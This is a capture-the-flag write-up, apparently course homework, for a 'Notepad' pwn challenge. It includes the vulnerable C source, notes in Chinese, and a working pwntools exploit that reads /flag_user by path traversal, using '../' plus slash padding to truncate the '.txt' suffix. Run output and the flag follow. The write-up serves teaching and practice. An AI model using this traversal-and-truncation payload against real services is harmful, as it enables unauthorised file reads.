---
title: Simple PWN 0x31(2023 HW - Notepad - Stage - 1)
tags: [eductf, CTF, PWN]

category: "Security/Course/NTU CS/PWN"
---

# Simple PWN 0x31(2023 HW - Notepad - Stage - 1)
<!-- more -->

## Description & Hint
> nc 10.113.184.121 10044
>
>You should solve the PoW to invoke a new instance.
>You can use the pow_solver.py script in the released zip to solve the PoW.
>After you solve the PoW, the service will create a new container and show >you the port. Connect it to play this challenge!
>The container will be destroy at 5 minutes. So you should debug your exploit in your environment.
>
>Image Base: ubuntu:22.04 (e4c58958181a)
>
>Try to get /flag_user.
>
>File: Notepad-release_fa266ab516200ef4.zip
>
>Hint: Path Traversal

## Source code
:::spoiler Source Code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <time.h>
#include <arpa/inet.h>
#include <limits.h>
#include "SECCOMP.h"

#define USERNAME_LEN 0x10
#define PASSWORD_LEN 0x10

#define CMD_Register 0x1
#define CMD_Login 0x2
#define CMD_GetFolder 0x11
#define CMD_NewNote 0x12
#define CMD_Flag 0x8787

#define RES_Success 0x0
#define RES_Failed 0x1
#define RES_NotFound 0x2

struct sock_filter seccompfilter[]={
  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField),
  BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
  BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum),
  Allow(open),
  Allow(openat),
  Allow(lseek),
  Allow(read),
  Allow(write),
  Allow(socket),
  Allow(connect),
  Allow(close),
  Allow(readlink),
  Allow(getdents),
  Allow(getrandom),
  Allow(brk),
  Allow(rt_sigreturn),
  Allow(exit),
  Allow(exit_group),
  BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog filterprog={
  .len=sizeof(seccompfilter)/sizeof(struct sock_filter),
  .filter=seccompfilter
};

void apply_seccomp(){
  if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){
    perror("Seccomp Error");
    exit(1);
  }
  if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&filterprog)==-1){
    perror("Seccomp Error");
    exit(1);
  }
  return;
}

struct Command
{
    __uint32_t cmd;
    u_char token[32];
    u_char args[128];
};

struct Response
{
    __uint32_t code;
    u_char res[256];
};

char *Token;

void errorexit(char *msg)
{
    puts(msg);
    exit(-1);
}

int connect_backend()
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in info;
    bzero(&info, sizeof(info));
    info.sin_family = PF_INET;
    info.sin_addr.s_addr = inet_addr("127.0.0.1");
    info.sin_port = htons(8765);
    if(connect(fd, (struct sockaddr *)&info, sizeof(info))==-1){
        return -1;
    }
    return fd;
}

void command_login(int fd, char *username, char *password)
{
    if(strlen(username)>=USERNAME_LEN || strlen(password)>=PASSWORD_LEN){
        errorexit("Username or Password too long.");
        return ;
    }
    struct Command cmd;
    memset(&cmd, 0, sizeof(cmd));
    cmd.cmd = CMD_Login;
    strcpy(cmd.args, username);
    strcpy(&cmd.args[strlen(cmd.args)+1], password);
    write(fd, &cmd, sizeof(cmd));
    struct Response res;
    memset(&res, 0, sizeof(res));
    if(read(fd, &res, sizeof(res))!=sizeof(res)){
        errorexit("Error while recv backend response.");
    }
    if(res.code==RES_Success){
        Token = strdup(res.res);
        puts("Login Success!");
    }
    else{
        Token = 0;
        puts("Login Failed!");
    }
}

void command_register(int fd, char *username, char *password)
{
    if(strlen(username)>=USERNAME_LEN || strlen(password)>=PASSWORD_LEN){
        puts("Username or Password too long.");
        return ;
    }
    struct Command cmd;
    memset(&cmd, 0, sizeof(cmd));
    cmd.cmd = CMD_Register;
    strcpy(cmd.args, username);
    strcpy(&cmd.args[strlen(cmd.args)+1], password);
    write(fd, &cmd, sizeof(cmd));
    struct Response res;
    memset(&res, 0, sizeof(res));
    if(read(fd, &res, sizeof(res))!=sizeof(res)){
        puts("Error while recv backend response.");
        return ;
    }
    if(res.code==RES_Success){
        puts("Register Success!");
    }
    else{
        puts("Register Failed!");
    }
}

void command_newnote(int fd, char *notename, char *content)
{
    if(!Token)
    {
        puts("Please login first.");
        return ;
    }
    struct Command cmd;
    memset(&cmd, 0, sizeof(cmd));
    struct Response res;
    memset(&res, 0, sizeof(res));
    cmd.cmd = CMD_NewNote;
    strcpy(cmd.token, Token);
    strncpy(cmd.args, notename, sizeof(cmd.args));
    write(fd, &cmd, sizeof(cmd));
    if(read(fd, &res, sizeof(res))!=sizeof(res)){
        puts("Error while recv backend response.");
        return ;
    }
    if(res.code!=RES_Success){
        puts("Note create failed.");
        return ;
    }
    //puts("Backend has created the note file.");
    int newfile_fd = open(res.res, O_RDWR);
    if(newfile_fd<0){
        puts("Note create failed.");
        return ;
    }
    write(newfile_fd, content, strlen(content));
    close(newfile_fd);
    puts("Note created!");
}

int openfile(int fd, char *notename, off_t offset, int oflag)
{
    if(!Token)
    {
        puts("Please login first.");
        return -1;
    }
    struct Command cmd;
    memset(&cmd, 0, sizeof(cmd));
    struct Response res;
    memset(&res, 0, sizeof(res));
    cmd.cmd = CMD_GetFolder;
    strcpy(cmd.token, Token);
    write(fd, &cmd, sizeof(cmd));
    if(read(fd, &res, sizeof(res))!=sizeof(res)){
        puts("Error while recv backend response.");
        return -1;
    }
    if(res.code!=RES_Success){
        puts("Couldn't get note storage path.");
        return -1;
    }
    char path[128];
    //strcpy(path, res.res);
    snprintf(path, sizeof(path), "%s%s.txt",res.res, notename);
    //char rpath[128];
    //realpath(path, rpath);
    //puts(rpath);
    int filefd = open(path, oflag);
    if(filefd < 0){
        puts("Couldn't open the file.");
        return -1;
    }
    lseek(filefd, offset, SEEK_SET);
    return filefd;
}

void command_editnote(int fd, char *notename, off_t offset, char *content)
{
    
    int filefd = openfile(fd, notename, offset, O_RDWR);
    write(filefd, content, strlen(content));
    close(filefd);
    puts("Note modified.");
}

void command_shownote(int fd, char *notename, off_t offset)
{
    int filefd = openfile(fd, notename, offset, O_RDONLY);
    char buf[128];
    ssize_t readlen = read(filefd, buf, sizeof(buf));
    if(readlen<=0){
        puts("Read note failed.");
        return ;
    }
    write(1, buf, readlen);
}

void menu()
{
    puts("+==========      Notepad       ==========+");
    puts("| 1. Login                               |");
    puts("| 2. Register                            |");
    puts("| 3. New Note                            |");
    puts("| 4. Edit Note                           |");
    puts("| 5. Show Note                           |");
    puts("+========================================+");
    printf("> ");
}

long readint()
{
    char buf[32];
    for(int i=0;i<31;i++){
        if(read(0, &buf[i], 1)!=1)
            break;
        if(buf[i]=='\n'){
            buf[i] = 0;
            break;
        }
    }
    return atol(buf);
}

size_t readlen(char *buf, size_t len)
{
    size_t i=0;
    for(;i<len;i++){
        if(read(0, &buf[i], 1)!=1)
            break;
        if(buf[i]=='\n')
            buf[i] = 0;
    }
    return i;
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    apply_seccomp();
    char username[0x20];
    char password[0x20];
    char notename[256];
    char *content;
    size_t clen;
    off_t offset;
    while(1){
        menu();
        int choice = readint();
        int backendfd = connect_backend();
        if(backendfd<=0)errorexit("Couldn't connect to backend.");
        switch(choice){
            case 1:
                printf("Username: ");
                read(0, username, 0x10);
                printf("Password: ");
                read(0, password, 0x10);
                command_login(backendfd, username, password);
                break;
            case 2:
                printf("Username: ");
                read(0, username, 0x10);
                printf("Password: ");
                read(0, password, 0x10);
                command_register(backendfd, username, password);
                break;
            case 3:
                printf("Note Name: ");
                read(0, notename, 128);
                if(strlen(notename) && notename[strlen(notename)-1]=='\n')
                    notename[strlen(notename)-1] = 0;
                printf("Content Length: ");
                clen = (size_t)readint();
                if(clen > 1024){
                    puts("Too Long");
                    break;
                }
                content = malloc(clen+1);
                printf("Content: ");
                readlen(content, clen);
                command_newnote(backendfd, notename, content);
                break;
            case 4:
                printf("Note Name: ");
                read(0, notename, 128);
                if(strlen(notename) && notename[strlen(notename)-1]=='\n')
                    notename[strlen(notename)-1] = 0;
                printf("Offset: ");
                offset = (off_t)readint();
                printf("Content Length: ");
                clen = (size_t)readint();
                if(clen > 1024){
                    puts("Too Long");
                    break;
                }
                content = malloc(clen+1);
                printf("Content: ");
                readlen(content, clen);
                command_editnote(backendfd, notename, offset, content);
                break;
            case 5:
                printf("Note Name: ");
                read(0, notename, 128);
                if(strlen(notename) && notename[strlen(notename)-1]=='\n')
                    notename[strlen(notename)-1] = 0;
                printf("Offset: ");
                offset = (off_t)readint();
                command_shownote(backendfd, notename, offset);
                break;
            default:
                break;
        }
        close(backendfd);
    }
    return 0;
}
```
:::

## Recon
這一題是等到助教給出hint才之到大概的方向，我一開始也是有一些初步的方向，不過不知道怎麼把卡住的地方解決，最後也是求助@davidchen學長才知道確切的方法。

1. 首先，感謝@csotaku 的提示與切入方向，既然知道是path traversal的洞，那就代表某個地方我們可以輸入一些簡單的payload，例如`./`，而這個地方還必須和讀檔有關係，想到這邊我們的選擇也呼之欲出，洞就在==openfile==的地方，我們輸入的notename會和`res.res`以及`.txt` concatenate在一起，，不過這邊有個問題是既然我們要順利讀檔，在說明中就有提到檔案名稱是==flag_user==，而不是flag_user.txt，這樣的話我們就應該要想辦法把`.txt` bypass掉

    想到這邊我先說我的看法，如果要把`.txt` bypass掉，一開始是參考[飛飛的網站範例](https://feifei.tw/file-path-traversal/)中有針對URL based的path traversal類似的情況在payload的最後面加上null byte，所以我想可以用同樣的方式bypass(`\x00`)，但是怎樣的沒有成功，另外我還有一個疑問，res.res的部分到底是不是一個path，如果不是，就代表我們也需要把它蓋掉或是用其他方法leak出來之類的；當然如果是path的話就沒差了，但我很常陷入這種沒有必要的迴圈轉不出來，其實現在仔細想想，他一定是一個path，因為他最後也是要和`{notename}.txt`接在一起，如果他不是path就一定讀不到
    
2. 反正後來和@davidchen討論完才大致知道如何寫script，簡單來說，因為path的限制長度是128 bytes，所以`res.res` + {notename} + `.txt`基本上長度不會超過128 bytes，如果會的話就會被擠出去，所以我們能夠控制的部分就是notename，雖然我們不知道`res.res`的長度多少，但我們可以爆破，讓這三者串在一起會大於128 bytes並且沒有被寫入path的部分就是`.txt`，這樣的話就可以順利讀到flag的內容，具體怎麼做就是一直加上`/`

## Exploit - Path Traversal
因為這一題需要進行pow，才能順利開一個vm給我們，並且把port number讓我們連過去

### ==PoW.py==
這是助教寫的script
```python
#!/usr/bin/env python3
import hashlib
import sys

prefix = sys.argv[1]
difficulty = int(sys.argv[2])
zeros = '0' * difficulty

def is_valid(digest):
    if sys.version_info.major == 2:
        digest = [ord(i) for i in digest]
    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
    return bits[:difficulty] == zeros


i = 0
while True:
    i += 1
    s = prefix + str(i)
    if is_valid(hashlib.sha256(s.encode()).digest()):
        print(i)
        exit(0)
```

### ==pow.py==
這是我寫的pow，就是簡單的subprocess的執行助教給的script，然後傳送和接收一些IO
```python
from pwn import *
from subprocess import *


'''#########
Dealing Connection and PoW
#########'''
r = remote('10.113.184.121', 10044)
r.recvuntil(b'sha256(')
prefix = r.recvuntil(b' + ').strip().decode().split(' ')[0]
difficulty = r.recvline().strip().decode().split('(')[-1].split(')')[0]

log.info(f"PoW's prefix = {prefix}, difficulty = {difficulty}")

p = Popen(f"python ../pow_solver.py {prefix} {difficulty}", stdin=PIPE, stdout=PIPE, universal_newlines=True, shell=True)
pow_result = p.stdout.readline().strip()
log.info(f'PoW Result = {pow_result}')
r.sendline(pow_result.encode())
r.recvuntil(b'Your service is running on port ')
init_port = r.recvuntil(b'.').decode().split('.')[0]
log.success(f'Receive Port = {init_port}')
r.close()
```

### ==exp.py==
```python
from pwn import *
from tqdm import *

cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', offset=b'0', random='0'):
    r.recvlines(7)
    if cmd == 1 or cmd == 2:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Username: ', b'sbk' + random.encode())
        r.sendlineafter(b'Password: ', b'sbk' + random.encode())
        if b'Success' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error('Command Login Failed!!!')
    
    if cmd == 3:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'created' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 4:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'modified' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 5:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        res = r.recvline().decode().strip()
        if 'flag' in res:
            log.success(res)
            log.success(r.recvline().decode().strip())
            return 1

'''#########
Dealing Exploit
#########'''
init_port = sys.argv[1]
r = remote('10.113.184.121', init_port)
random = os.urandom(1).hex()
dealing_cmd(r, 2, random=random)
dealing_cmd(r, 1, random=random)

payload = b'../../../../../../'
while len(payload) < 128:
    payload += b'/'
    # print(payload)
    res = dealing_cmd(r, 5, payload + b'flag_user')
    if res:
        print(f'Successful payload = {payload + b"flag_user"}')
        break

log.info("Done")
r.interactive()
```

所以實際執行會是:
```bash
$ python pow.py
[+] Opening connection to 10.113.184.121 on port 10044: Done
[*] PoW's prefix = CrWNJGbeaBn7NjUe, difficulty = 22
[*] PoW Result = 4122665
[+] Receive Port = 26616
[*] Closed connection to 10.113.184.121 port 10044
$ python exp-1.py 26616
python exp-1.py 26616
[+] Opening connection to 10.113.184.121 on port 26616: Done
[+] Command Register Successful
[+] Command Login Successful
[+] flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}+==========      Notepad       ==========+
[+] | 1. Login                               |
Successful payload = b'../../../../../../////////////////////////////////////////////////////////////////////////////////flag_user'
[*] Done
[*] Switching to interactive mode
| 2. Register                            |
| 3. New Note                            |
| 4. Edit Note                           |
| 5. Show Note                           |
+========================================+
> $
```

Flag: `flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}`